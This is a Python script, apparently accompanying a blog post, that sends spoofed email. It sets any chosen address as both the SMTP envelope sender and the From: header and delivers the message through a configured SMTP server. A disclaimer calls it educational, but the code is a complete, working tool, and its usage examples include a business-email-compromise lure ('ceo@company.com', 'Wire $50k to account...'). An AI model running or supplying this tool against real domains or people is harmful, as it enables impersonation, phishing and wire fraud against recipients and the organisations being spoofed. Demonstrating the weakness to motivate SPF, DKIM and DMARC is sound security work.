#!/usr/bin/env python3
"""
dtrh_mail_send - Email Spoofing Demonstration Tool
Educational tool to demonstrate how email spoofing works (as described in the blog post).

Usage:
    python dtrh_mail_send.py "spoofed@domain.com" "Subject" "Message body"

This sends an email with:
- MAIL FROM (envelope sender): spoofed@domain.com
- From: header: spoofed@domain.com
- To: configured target address

⚠️ FOR EDUCATIONAL/RESEARCH PURPOSES ONLY
Only use against domains you own or have explicit permission to test.
Unauthorized email spoofing is illegal in many jurisdictions.
"""

import sys
import smtplib
import argparse
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formatdate, make_msgid
from pathlib import Path

# Configuration - EDIT THESE
SMTP_HOST = "smtp.example.com"      # Your SMTP server
SMTP_PORT = 587                      # 587 (STARTTLS) or 465 (SSL)
SMTP_USER = "your@email.com"         # Auth username
SMTP_PASS = "your-password"          # Auth password
TARGET_EMAIL = "target@example.com"  # Where to send the test email
USE_TLS = True                       # True for STARTTLS (port 587), False for SSL (port 465)

CONFIG_FILE = Path(__file__).with_name("dtrh_mail_send.conf")


def load_config():
    """Load config from file if exists, otherwise use defaults above."""
    global SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS, TARGET_EMAIL, USE_TLS
    
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE) as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if "=" in line:
                        key, val = line.split("=", 1)
                        key = key.strip().upper()
                        val = val.strip().strip('"\'')
                        if key == "SMTP_HOST":
                            SMTP_HOST = val
                        elif key == "SMTP_PORT":
                            SMTP_PORT = int(val)
                        elif key == "SMTP_USER":
                            SMTP_USER = val
                        elif key == "SMTP_PASS":
                            SMTP_PASS = val
                        elif key == "TARGET_EMAIL":
                            TARGET_EMAIL = val
                        elif key == "USE_TLS":
                            USE_TLS = val.lower() in ("true", "1", "yes")
        except Exception as e:
            print(f"Warning: Could not load config: {e}", file=sys.stderr)


def create_config_template():
    """Create a sample config file."""
    template = """# dtrh_mail_send configuration
# Copy this file and edit with your SMTP credentials

SMTP_HOST = "smtp.example.com"
SMTP_PORT = 587
SMTP_USER = "your@email.com"
SMTP_PASS = "your-password"
TARGET_EMAIL = "target@example.com"
USE_TLS = true
"""
    CONFIG_FILE.write_text(template)
    print(f"Created config template at {CONFIG_FILE}")
    print("Edit it with your SMTP credentials before using the tool.")


def send_spoofed_email(spoofed_address: str, subject: str, message: str) -> bool:
    """
    Send an email with spoofed MAIL FROM and From: header.
    
    This demonstrates the core vulnerability: SMTP allows specifying
    any MAIL FROM address during the envelope phase, and the From:
    header is just a header - neither are verified by default.
    """
    
    # Build the message
    msg = MIMEMultipart("alternative")
    msg["From"] = spoofed_address           # This is what recipient sees
    msg["To"] = TARGET_EMAIL                # This is where it goes
    msg["Subject"] = subject
    msg["Date"] = formatdate(localtime=True)
    msg["Message-ID"] = make_msgid(domain=spoofed_address.split("@")[-1])
    
    # Add both plain text and HTML versions
    text_part = MIMEText(message, "plain", "utf-8")
    html_part = MIMEText(f"<pre>{message}</pre>", "html", "utf-8")
    msg.attach(text_part)
    msg.attach(html_part)
    
    try:
        if USE_TLS:
            # STARTTLS (port 587)
            server = smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=10)
            server.ehlo()
            server.starttls()
            server.ehlo()
        else:
            # SSL (port 465)
            server = smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, timeout=10)
        
        server.login(SMTP_USER, SMTP_PASS)
        
        # THE KEY PART: MAIL FROM is set here (envelope sender)
        # This is what bounces go to, and what SPF checks
        server.sendmail(
            from_addr=spoofed_address,      # ← ENVELOPE SENDER (MAIL FROM)
            to_addrs=[TARGET_EMAIL],
            msg=msg.as_string()
        )
        server.quit()
        return True
        
    except smtplib.SMTPAuthenticationError:
        print("❌ SMTP Authentication failed. Check credentials in config.", file=sys.stderr)
        return False
    except smtplib.SMTPRecipientsRefused as e:
        print(f"❌ Recipient refused: {e}", file=sys.stderr)
        return False
    except smtplib.SMTPSenderRefused as e:
        print(f"❌ Sender refused (server may block spoofed MAIL FROM): {e}", file=sys.stderr)
        return False
    except Exception as e:
        print(f"❌ Error: {e}", file=sys.stderr)
        return False


def main():
    parser = argparse.ArgumentParser(
        description="Email Spoofing Demonstration Tool (Educational)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python dtrh_mail_send.py "ceo@company.com" "Urgent" "Wire $50k to account..."
  python dtrh_mail_send.py "admin@dtrh.net" "Test" "This is a spoof test"

Config: Create dtrh_mail_send.conf with your SMTP settings.
        """
    )
    parser.add_argument("address", help="Email address to spoof (MAIL FROM + From: header)")
    parser.add_argument("subject", help="Email subject")
    parser.add_argument("message", help="Email body text")
    parser.add_argument("--init-config", action="store_true", help="Create sample config file")
    
    args = parser.parse_args()
    
    if args.init_config:
        create_config_template()
        return 0
    
    load_config()
    
    # Validate config
    if SMTP_HOST == "smtp.example.com":
        print("❌ Please configure SMTP settings first:")
        print(f"   Edit {CONFIG_FILE} or set SMTP_HOST/SMTP_PORT/SMTP_USER/SMTP_PASS/TARGET_EMAIL")
        print("   Run with --init-config to create a template")
        return 1
    
    # Basic validation
    if "@" not in args.address:
        print("❌ Invalid spoofed address (must contain @)")
        return 1
    
    print(f"📧 Sending spoofed email...")
    print(f"   From (envelope + header): {args.address}")
    print(f"   To: {TARGET_EMAIL}")
    print(f"   Subject: {args.subject}")
    print(f"   Via: {SMTP_HOST}:{SMTP_PORT} {'(STARTTLS)' if USE_TLS else '(SSL)'}")
    
    success = send_spoofed_email(args.address, args.subject, args.message)
    
    if success:
        print("✅ Email sent successfully!")
        print(f"   Check {TARGET_EMAIL} inbox (and spam folder)")
        print("   Note: DMARC/SPF/DKIM may cause rejection or spam folder placement")
        return 0
    else:
        return 1


if __name__ == "__main__":
    sys.exit(main())